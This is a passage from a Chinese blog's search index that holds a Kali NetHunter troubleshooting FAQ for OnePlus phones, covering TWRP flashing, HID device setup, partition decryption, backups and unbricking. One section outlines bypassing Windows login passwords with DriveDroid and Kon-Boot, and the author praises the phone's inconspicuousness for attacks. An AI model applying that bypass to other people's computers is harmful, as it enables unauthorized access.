twrp_op8_ext4-3.7.0-b3.img<br>fastboot flash recovery_b twrp_op8_erofs-3.7.0-b3.img</p><p>刷入beta版本的。笔者也会在上面链接里给出资源。</p><p>参考文章[[TWRP][3.7.0-13][instantnoodle]TWRP for OnePlus 8&#x2F;8Pro ][OFFICIAL][BETA 3] | XDA Forums](<a href="https://xdaforums.com/t/twrp-3-7-0-13-instantnoodle-twrp-for-oneplus-8-8pro-official-beta-3.4341707/">https://xdaforums.com/t/twrp-3-7-0-13-instantnoodle-twrp-for-oneplus-8-8pro-official-beta-3.4341707/</a>)</p><h2 id="成功刷入内核之后。怎么rucky-duckHunter-HID还是无法正常使用？如何解决？"><a href="#成功刷入内核之后。怎么rucky-duckHunter-HID还是无法正常使用？如何解决？" class="headerlink" title="成功刷入内核之后。怎么rucky,duckHunter HID还是无法正常使用？如何解决？:"></a>成功刷入内核之后。怎么rucky,duckHunter HID还是无法正常使用？如何解决？:</h2><p>当我们遇到HID interface not found please enable in usb arsenal或者usb arsenal里有failed to set usb function或者kernel not support hid等等字眼的时候.</p><p>解决方法如下：</p><p>1:关闭usb调试。如果开启就无法正常检测HID。</p><p>2:usb arsenal里的usb function选择rndis,hid,mass_storage</p><p>界面的adb改成 disabled。</p><p>3:执行如下命令mknod –mode&#x3D;666 &#x2F;dev&#x2F;hidg0 c 240 0 &amp;&amp; mknod –mode&#x3D;666 &#x2F;dev&#x2F;hidg1 c 240 1 &amp;&amp; dmesg | grep hidg</p><h2 id="分区解密是什么？为什么我twrp打开没东西或者东西极少？但是usb连接手机之后在电脑上能看到并且一堆东西？为什么我的twrp打开都是乱码？"><a href="#分区解密是什么？为什么我twrp打开没东西或者东西极少？但是usb连接手机之后在电脑上能看到并且一堆东西？为什么我的twrp打开都是乱码？" class="headerlink" title="分区解密是什么？为什么我twrp打开没东西或者东西极少？但是usb连接手机之后在电脑上能看到并且一堆东西？为什么我的twrp打开都是乱码？"></a>分区解密是什么？为什么我twrp打开没东西或者东西极少？但是usb连接手机之后在电脑上能看到并且一堆东西？为什么我的twrp打开都是乱码？</h2><p>分区都是加密的。</p><p>高版本的安卓的twrp可能会无法去自动解密解密。</p><p>原因可能是版本升级。很多软件在Android7,8还是Android10,11来着前后变化很大。因为底层东西变化了。</p><p>或者说变得更安全了。所以我们这些不符合厂商预期的危险操作也就更难了。</p><p>并且相关的很多的高版本twrp都处于beta状态。</p><p>比如这篇文章就是[[TWRP][3.7.0-13][instantnoodle]TWRP for OnePlus 8&#x2F;8Pro ][OFFICIAL][BETA 3] | XDA Forums](<a href="https://xdaforums.com/t/twrp-3-7-0-13-instantnoodle-twrp-for-oneplus-8-8pro-official-beta-3.4341707/">https://xdaforums.com/t/twrp-3-7-0-13-instantnoodle-twrp-for-oneplus-8-8pro-official-beta-3.4341707/</a>)</p><p>具体可自行去了解</p><p>解决方法：</p><p>要么换rec。要么用qfil提取分区文件然后重新刷。</p><p>第一种:换成相关版本的rec。还需要给手机上锁屏密码。然后进入rec之后会要求你输入密码。输入之后就可以正常解密分区了。</p><p>参考这个链接<a href="https://www.daxiaamu.com/6480/">一加各机型TWRP官方&#x2F;非官方版本，含最新3.7.0版本 - 大侠阿木博客 (daxiaamu.com)</a></p><p>第二种。不支持oneplus机型。其他机型可以尝试。</p><p>需要文件prog__ufs_firehose_sm8250_lge.elf(这个文件好像是通用的)和一个xml后缀的文件。一般在固件包里可以找到。但oneplus的固件包里我找不到。</p><p>除了QFIL还可以使用Medusa Box Software（也可以称为Medusa Pro Box）但是笔者找不到一个能用的破解版。要么就是付费的。要么就是远古时期的破解版什么的。但都无法使用。各位可以自行再去找找相关文件。也可能是我电脑原因无法正常运行。所以在下面放出一些参考链接。自行查阅</p><p>把分区用工具提取出来。然后重新刷入分区，并用命令让他不进行加密即可。</p><p>具体的命令笔者找不到了。是在一个youtube上看到的。。感兴趣的师傅们可以自行找找</p><p>参考网址：[下载 Medusa Pro Box 软件工具 v2.2.5.1 <a href="https://www.bypassfrpfiles.com/zh-CN/2024/01/download-medusa-pro-box-software/">最新版本] (bypassfrpfiles.com)</a></p><p><a href="https://medusabox.com/eng/download/software">Medusa Box Downloads - Software, Drivers, Manual</a></p><p><a href="https://medium.com/@hassancracksfull/medusa-pro-2-6-1-7-crack-without-box-full-setup-download-aa4ba7dd8a15">Medusa Pro 2.6.1.7 Crack + Without Box Full Setup Download | by Hassancracksfull | Medium</a></p><p><a href="https://imold.wang/technology/phone/1332.html/2/#%E8%A7%A3%E5%AF%86Data%E5%92%8C%E8%B7%B3%E8%BF%87%E8%B0%B7%E6%AD%8C%E5%BC%80%E6%9C%BA%E5%90%91%E5%AF%BC%E9%AA%8C%E8%AF%81">Lgv50终极超详细9008线刷救砖 – 第 2 页 – 极客轩 (imold.wang)</a></p><h2 id="为什么我一进入nethunter-terminal的root-shell就死机。未响应？我该如何解决？换成其他普通用户就行。但是一用su命令就会卡死。"><a href="#为什么我一进入nethunter-terminal的root-shell就死机。未响应？我该如何解决？换成其他普通用户就行。但是一用su命令就会卡死。" class="headerlink" title="为什么我一进入nethunter terminal的root shell就死机。未响应？我该如何解决？换成其他普通用户就行。但是一用su命令就会卡死。"></a>为什么我一进入nethunter terminal的root shell就死机。未响应？我该如何解决？换成其他普通用户就行。但是一用su命令就会卡死。</h2><p>请把你的magisk版本提高。因为如果你是跟着这个师傅的教程去使用的话。<a href="https://blog.csdn.net/a648642694/article/details/127450785">https://blog.csdn.net/a648642694/article/details/127450785</a></p><p>Magisk版本太低是23.0无法给nethunter terminal给予root权限。</p><p>请你升级到最新版本。原因无非就是magisk版本太低，检测不到root请求。</p><h2 id="只有一部手机怎么办？用之前该如何备份？如果刷机之后版本不同无法云备份等等或者云备份空间不够怎么办？："><a href="#只有一部手机怎么办？用之前该如何备份？如果刷机之后版本不同无法云备份等等或者云备份空间不够怎么办？：" class="headerlink" title="只有一部手机怎么办？用之前该如何备份？如果刷机之后版本不同无法云备份等等或者云备份空间不够怎么办？："></a>只有一部手机怎么办？用之前该如何备份？如果刷机之后版本不同无法云备份等等或者云备份空间不够怎么办？：</h2><p>使用databackup。上面的资源链接里会给出两个databackup apk文件。一个是低版本(某位师傅发我的)。一个是高版本。后续去release拿的。</p><p>大概使用方法：</p><p>手机和电脑处于同一内网。在你电脑里搭建ftp服务端。然后在云端里添加用户。填入名称和内网ip地址。用户名和密码。点击确定之后。会有一个测试连接的选项。点击测试。如果成功就可以开始传递你的数据上去。</p><p>如果不成功。那么请你检查是否处于同一内网。是否能ping通或者nmap扫出。检查防火墙是否配置成功。不会配置的可以暂时关掉。</p><p>最后点击云端这个界面有个九宫格的图标。里面有备份和恢复。上传到电脑备份就好。</p><p>这个老版的app不知道为什么无法正常上传图片。但其他都正常。所以请各位尝试新版的。下面图片是老版的app截图。</p><p>关于ftp云端搭建请看链接：<a href="https://blog.csdn.net/Alex_81D/article/details/135296467">超详情的Windows搭建FTP服务器教程-（老奶奶来了也能搭好）_windows安装ftp-CSDN博客</a></p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20240707024843525.png" alt="image-20240707024843525"></p><h2 id="刷成板砖了怎么办？？？如何救？："><a href="#刷成板砖了怎么办？？？如何救？：" class="headerlink" title="刷成板砖了怎么办？？？如何救？："></a>刷成板砖了怎么办？？？如何救？：</h2><p>通过9008端口刷。</p><p>但是网上的驱动千奇百怪。有些根本用不了。笔者会在资源链接里放出驱动和 oneplus8T机型的9008刷机工具。</p><p>刷完之后对应的版本型号就是笔者上述案例里的机型型号。无需更新和降级了。</p><p>其他机型的9008刷机和9008的使用方法可以参考文章：<a href="https://onfix.cn/course/4716">9008 端口终极刷机攻略：救砖、清密码、或者定制系统刷到正常系统刷机解锁 (onfix.cn)</a></p><p><a href="https://web.vip.miui.com/page/info/mio/mio/detail?isTop=1&postId=18656253&fromBoardId=&app_version=dev.10118&ori_version=dev.1157&ori_miui_version=20.2.27&ori_android_version=10&ori_front_version=134&ref=share&from=groupmessage">9008模式深刷-刷机教程 (miui.com)</a></p><h2 id="DriveDroid-Kon-Boot绕过win11-win10-win7等等登录密码。"><a href="#DriveDroid-Kon-Boot绕过win11-win10-win7等等登录密码。" class="headerlink" title="DriveDroid+Kon-Boot绕过win11,win10,win7等等登录密码。"></a>DriveDroid+Kon-Boot绕过win11,win10,win7等等登录密码。</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>Kon-Boot 是一种绕过操作系统密码验证的工具。它通过在操作系统启动时注入内存中的特定代码来实现这个功能。Kon-Boot 不会修改硬盘上的任何文件或注册表，而是通过改变启动过程中的认证机制来临时绕过密码。</p><p>具体来说，Kon-Boot 的工作原理如下：</p><ul><li><strong>启动注入</strong>: 当系统从 Kon-Boot 启动时，它会在引导加载器阶段注入特定代码到操作系统的内存中。</li><li><strong>修改认证过程</strong>: 这个代码会改变 Windows 操作系统的认证机制，使得任何输入的密码都被认为是正确的。</li><li><strong>内存驻留</strong>: 这种修改仅驻留在内存中，并不会持久化到硬盘上。这意味着在系统重启后，如果不再使用 Kon-Boot 启动，认证机制会恢复正常。</li></ul><p>DriveDroid 是一个允许你将安卓手机变成虚拟 USB 驱动器的应用程序。它能让你从手机上的 ISO 或 IMG 文件引导电脑。这是通过在手机上挂载这些镜像文件，并让电脑将手机识别为 USB 启动设备来实现的。</p><h3 id="操作步骤："><a href="#操作步骤：" class="headerlink" title="操作步骤："></a>操作步骤：</h3><p><strong>安装和运行 DriveDroid</strong>:</p><ul><li>DriveDroid 利用安卓设备的 Root 权限来创建和管理虚拟 USB 驱动器。</li><li>通过挂载 ISO 文件，DriveDroid 可以将手机模拟成一个包含该 ISO 文件内容的 USB 驱动器。</li></ul><p><strong>加载和挂载 ISO 文件</strong>:</p><ul><li>Kon-Boot 的 ISO 文件包含启动加载器和用于修改认证过程的代码。</li><li>当 DriveDroid 挂载该 ISO 文件后，电脑会将其识别为可引导的 USB 驱动器。</li></ul><p><strong>启动并修改认证过程</strong>:</p><ul><li>在电脑 BIOS 设置中选择从 USB 设备启动后，电脑将从挂载在手机上的 Kon-Boot ISO 文件启动。</li><li>Kon-Boot 的引导加载器会首先运行，并在内存中注入修改认证过程的代码。</li><li>当 Windows 开始启动时，注入的代码会接管认证过程，使得任何输入的密码都被认为是正确的。</li></ul><p>参考链接：<a href="https://www.hackingarticles.in/bypass-windows-login-password-using-android-phone-drivedroid/">https://www.hackingarticles.in/bypass-windows-login-password-using-android-phone-drivedroid/</a></p><p><a href="https://kon-boot.com/docs/windows_guide/#whats-kon-boot-for-windows">https://kon-boot.com/docs/windows_guide/#whats-kon-boot-for-windows</a></p><p>笔者偶然间看到的文章。还没深入了解。后续研究后会出更详细的笔记。</p><h2 id="闲谈-更高版本的nethunter如何刷以及nethunter有什么好处"><a href="#闲谈-更高版本的nethunter如何刷以及nethunter有什么好处" class="headerlink" title="闲谈:更高版本的nethunter如何刷以及nethunter有什么好处"></a>闲谈:更高版本的nethunter如何刷以及nethunter有什么好处</h2><p>本人oneplus8T刷不出更高版本Android12(13)的nethunter。但是外网上有oneplus 8pro的Android12(13)的nethunter的教程。相关机型的师傅可以自行查阅。</p><p>因为遇到一些各种阻碍。我这个机型的。其他机型的师傅可以尝试尝试。参考以下视频</p><p><a href="https://www.youtube.com/watch?v=ncMjiQAMMn8">Nethunter - Kali Linux - Android 12 - Rooted Installation - Oneplus 8 pro - Step by step setup guide (youtube.com)</a></p><p>在于便捷性，隐蔽性。成本低。</p><p>便捷性和隐蔽性就在于你把提前写好的代码放在手机上。直接运行就好。并且可四处带动。相较于笔记本电脑来说。非常轻便。不会引人注目。干点恶作剧也会更加的方便。</p><p>并且很多功能比如信号模拟，蓝牙，无线等等的攻击手段。就是一种目标种类多且需要四处走动的攻击目标。带一个笔记本肯定不方便。还会显得很愚蠢</p><p>成本低在于：市面上比较成熟的hacker工具或者说玩具什么的。比如hackrf,badusb等等这些工具单独买的成本加在一起是远大于一个二手的刷了kali nethunter的手机。所以入手一个二手手机专门刷内核和kali拿来玩玩的成本更低。</p><hr><p>优秀的参考链接（懒得整理）：[<a href="https://xdaforums.com/t/rom-official-kali-nethunter-for-the-oneplus-7-oneplus-7-pro.3976357/">ROM] [Official] Kali NetHunter for the OnePlus 7 &amp; OnePlus 7 Pro | XDA Forums</a></p><p><a href="https://blog.csdn.net/a648642694/article/details/127450785">一加8 pro 刷入 kali Hunter_oneplus8 刷nethunter-CSDN博客</a></p><p>[<a href="https://xdaforums.com/t/rom-unofficial-nethunter-oneplus-8t-android-11-12-26-08-21.4324555/">ROM] [Unofficial] NetHunter [OnePlus 8T] [Android 11 &amp; 12] [26.08.21] | XDA Forums</a></p><p><a href="https://droidwin.com/how-to-make-system-partition-read-write-on-android/">How to Make System Partition Read Write on Android (droidwin.com)</a></p><p>[<a href="https://xdaforums.com/t/magisk-twrp-arm32-64-a8-universal-read-only-to-read-write-for-android-ro2rw-auto-converting-super-system-partitions-to-read-write-mode.4521131/">MAGISK][TWRP][ARM32&#x2F;64][A8+]Universal Read Only to Read Write for android (RO2RW) | Auto converting SUPER “system partitions” to read&#x2F;write mode | XDA Forums</a></p><p><a href="https://droidwin.com/how-to-install-kali-linux-nethunter-rom-on-oneplus-8-pro-8t/">How to Install Kali Linux NetHunter ROM on OnePlus 8&#x2F;Pro&#x2F;8T (droidwin.com)</a></p><p><a href="https://www.youtube.com/watch?v=ncMjiQAMMn8">Nethunter - Kali Linux - Android 12 - Rooted Installation - Oneplus 8 pro - Step by step setup guide - YouTube</a></p><p>[How To Guide - <a href="https://xdaforums.com/t/guide-how-to-make-your-system-rw-super-r-w-read-write-able.4258745/">GUIDE] How to make your System RW &#x2F; Super R&#x2F;W read&#x2F;write-able | XDA Forums</a></p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nethunter       //多个标签可以这样添加 </tag>
            
            <tag> kali--- </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
    </entry>
    
    
  
</search>
